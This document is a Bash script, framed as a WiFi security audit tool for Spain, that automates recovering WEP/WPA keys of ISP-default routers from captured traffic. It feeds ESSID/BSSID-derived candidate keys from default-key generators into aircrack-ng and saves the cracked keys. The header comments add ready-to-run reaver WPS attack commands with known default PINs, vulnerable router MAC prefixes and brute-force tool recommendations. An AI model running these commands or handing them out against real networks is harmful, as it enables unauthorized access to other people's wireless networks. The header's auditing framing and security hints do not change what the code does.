#!/bin/bash
#
# wifi_audit_es.sh
#
# This script automates the execution of many individual third party security tools (not provided, just named).
#
# License:
# - Public domain (use it at your own risk)
#
# Observations:
# - Auditing context: Spain (es). It will probably not work at all in other countries.
# - The purpose is just to speed-up WiFi security auditing. 
# - This script works offline, not affecting/interferring WiFi networks.
# - Security hints: Change router default password and disable WPS.
#
# Tested with:
#  Airodump-ng 1.1         http://www.aircrack-ng.org
#  Aircrack-ng 1.1         http://www.aircrack-ng.org
#  wlandecrypter v1.3.4    https://www.google.com/#q=wlandecrypter-1.3.4.tar.gz  (updated from v1.3.3)
#  jazzteldecrypter 0.2.1  https://www.google.com/#q=jazzteldecrypter-0.2.1.tar.gz
#  wlan4xx v0.2.0          https://www.google.com/#q=wlan4xx-0.2.0.tar.gz
#  WPAmagickey v0.2.4      https://www.google.com/#q=WPAmagickey-0.2.4.tar.gz (updated from v0.2.3)
#  ono4xx v0.0.3a          https://www.google.com/#q=ono4xx-0.0.3a.tar.gz
#  (e.g. build all the above and make them executable, e.g. make install or copy the executables to /usr/local/bin)
#
# Example:
#  airodump-ng mon0 --write test_lab
#  ./audit_wifi_es.sh
#  cat keys.txt
#
# Observations:
# - WLAN_XX, JAZZTEL_XX require 4 IVs
# - WLAN_XXXX, JAZZTEL_XXXX require 1 WPA handshake
# - Some JAZZTEL_XXXX verified passwords don't work (e.g. some router firmware with F8:8E:85:xx:xx:xx BSSID)
#
# Trivial checks with reaver 1.4 (not requiring this script):
#  https://code.google.com/p/reaver-wps/downloads/detail?name=reaver-1.4.tar.gzA
#  Almost instant (few seconds):
#  reaver -i mon? -b F8:8E:85:xx:xx:xx -c ? - d 10 -t 13 - T 2 - n -p 19117652 -vv       (MOVISTAR_XXXX, via lampiweb)
#  reaver -i mon? -b E4:C1:46:??:??:?? -c ? -d 10 -t 13 -T 2 -n -p 71537573 -vv          (MOVISTAR_XXXX, via lampiweb)
#  Fastest, for not attack-protected routers:
#  reaver -i mon? -b xx:xx:xx:xx:xx:xx -c ? -S -vv -d 0
#  e.g. some targets:
#      6A:xx:xx:xx:xx:xx (e.g. vodafoneXXXX), D0:AE:EC:xx:xx:xx
#      74:88:8B:xx:xx:xx, 8C:0C:A3:xx:xx:xx (WLAN_XXXX)
#
# Default WPS PIN vulnerabilities (not requiring this script):
#  Misc info: http://www.auditoriaswireless.net/index.php?topic=3993.0
#  WPSPIN.sh: http://lampiweb.com/foro/index.php?topic=9834.0
#
# "Semi" brute force (not requiring this script):
#  Orange-XXXX: http://lampiweb.com/foro/index.php?topic=9913.0
#  Jazztel_XX: C8:D1:5E:*, 4C:ED:DE:*, 28:5F:DB:*, B4:74:9F:*, E8:39:DF:*
#  JAZZTEL_XXXX: 38:72:C0:*
#
# Recommended brute force tools:
#  pyrit (can use OpenCL, open source)
#  oclHashcat (can use OpenCL, closed source, faster than pyrit in some cases)
#
# Changes:
# 20141002 Output changes (hex and ASCII keys). Tested with newer wlandecrypter and WPAmagickey. Public domain.
# 20120903 Implementation.
#

TMPDIR=$(mktemp -d)
AP_LIST=$TMPDIR/tmp0.txt
SORTED_AP_LIST=$TMPDIR/tmp1.txt
CANDIDATES=$TMPDIR/candidates.txt
KEY=$TMPDIR/key.txt
ASCII_KEY=$TMPDIR/ascii_key.txt
KEYS=keys.txt
ERRORS=err.txt

find . -name '*kismet*csv' | while read file
do
	#echo "$file:"
	cat $file | while read line
	do
		ESSID=$(echo $line | awk -F ';' '{print $3}')
		WMODE=$(echo $line | awk -F ';' '{print $8}')
		if (( $(echo $ESSID | grep -E 'WLAN|JAZZTEL|ONO|YaCom|WiFi' | wc -l) == 1 )) ; then
			BSSID=$(echo $line | awk -F ';' '{print $4}')
			echo "$BSSID $ESSID 	$WMODE" >>$AP_LIST
		fi
	done
done

if [ -f $AP_LIST ] ; then
	grep -v BSSID < $AP_LIST | sort -u | sed '/^$/d' >$SORTED_AP_LIST
	NUM_APS=$(wc -l < $SORTED_AP_LIST)
	cp $SORTED_AP_LIST ap.list
else
	NUM_APS=0
fi

if (( $NUM_APS >= 1 ))
then
	cat $SORTED_AP_LIST | while read line
	do
		rm -f $CANDIDATES $KEY 2>/dev/null
		BSSID=$(echo $line | awk '{print $1}')
		ESSID=$(echo $line | awk '{print $2}')

		# WLAN_xx -> wlandecrypter
		if [[ "$ESSID" == *WLAN_* && ${#ESSID} == 7 ]] ; then
			wlandecrypter $BSSID $ESSID >$CANDIDATES
		fi

		# JAZZTEL_xx -> jazzteldecrypter
		if [[ "$ESSID" == *JAZZTEL_* && ${#ESSID} == 10 ]] ; then
			jazzteldecrypter $BSSID $ESSID >$CANDIDATES
		fi

		# WLAN_xxxx/JAZZTEL_xxxx -> wpamagickey
		if [[   "$ESSID" == *WLAN_* && ${#ESSID} == 9 \
		     || "$ESSID" == *JAZZTEL_* && ${#ESSID} == 12 ]] ; then
			wpamagickey $ESSID $BSSID | grep -v -i wpamagic | grep -v -i 'essid' | grep -v -i 'clave.s' | sed '/^$/d' >$CANDIDATES
		fi

		# WLANxxxxxx/YaComxxxxxx/WiFixxxxxx -> wlan4xx
		if [[   "$ESSID" == *WLAN* && ${#ESSID} == 10 \
		     || "$ESSID" == *YaCom* && ${#ESSID} == 11 \
		     || "$ESSID" == *WiFi* && ${#ESSID} == 10 ]] ; then
			wlan4xx $ESSID $BSSID | grep -v -i wlan4xx | grep -v -i finalizado | sed '/^$/d' >$CANDIDATES
		fi

		# ONOxxxx -> ono4xx
		if [[ "$ESSID" == *ONO* && ${#ESSID} == 7 ]] ; then
			if [[ "$BSSID" == *00:01:38* ]] ; then
				ono4xx $ESSID $BSSID wep | grep -v -i ono4xx | sed '/^$/d' >$CANDIDATES
			else
				ono4xx $ESSID $BSSID wpa | grep -v -i ono4xx | sed '/^$/d' >$CANDIDATES
			fi
		fi

		echo "Processing: $ESSID $BSSID ..."

		if [ -f $CANDIDATES ] ; then
			aircrack-ng -b $BSSID -w $CANDIDATES -l $KEY -K *cap
			if [ -f $KEY ] ; then
				rm -f $ASCII_KEY
				cat $KEY | while read -n 2 hex
				do
					printf "\x$hex" >>$ASCII_KEY
				done
				#echo "$ESSID  $(cat $KEY)" >>$KEYS
				echo "$ESSID ($BSSID):	$(cat $KEY) (ASCII: $(cat $ASCII_KEY))" >>$KEYS
				cp $KEY "$ESSID.key"
			else
				if (( $(wc -l <$CANDIDATES) == 1 )) ; then	# Unique candidate key?
					echo "$ESSID  $(cat $CANDIDATES)   (not confirmed because not enough data, it may work -unique candidate-)" >>$KEYS
				else
					echo "$ESSID $BSSID (not enough data for key validation)" >>$ERRORS
					#echo "$ESSID $BSSID (not enough data for key validation, candidate keys provided in $ESSID.candidates.txt)" >>$ERRORS
					mv $CANDIDATES $ESSID.candidates.txt
				fi
			fi
		else
			echo "$ESSID $BSSID (not enough data for giving a key)" >>$ERRORS
		fi
	done
fi

if [ -d "$TMPDIR" ]
then
        rm -rf $TMPDIR
        echo >/dev/null
fi

touch $KEYS
KEYS_FOUND=$(wc -l <$KEYS)
if (( $KEYS_FOUND > 0 )) ; then
	echo "$KEYS_FOUND keys found (stored in $KEYS)"
	exit 0
else
	echo "Error: no keys found."
	exit 1
fi


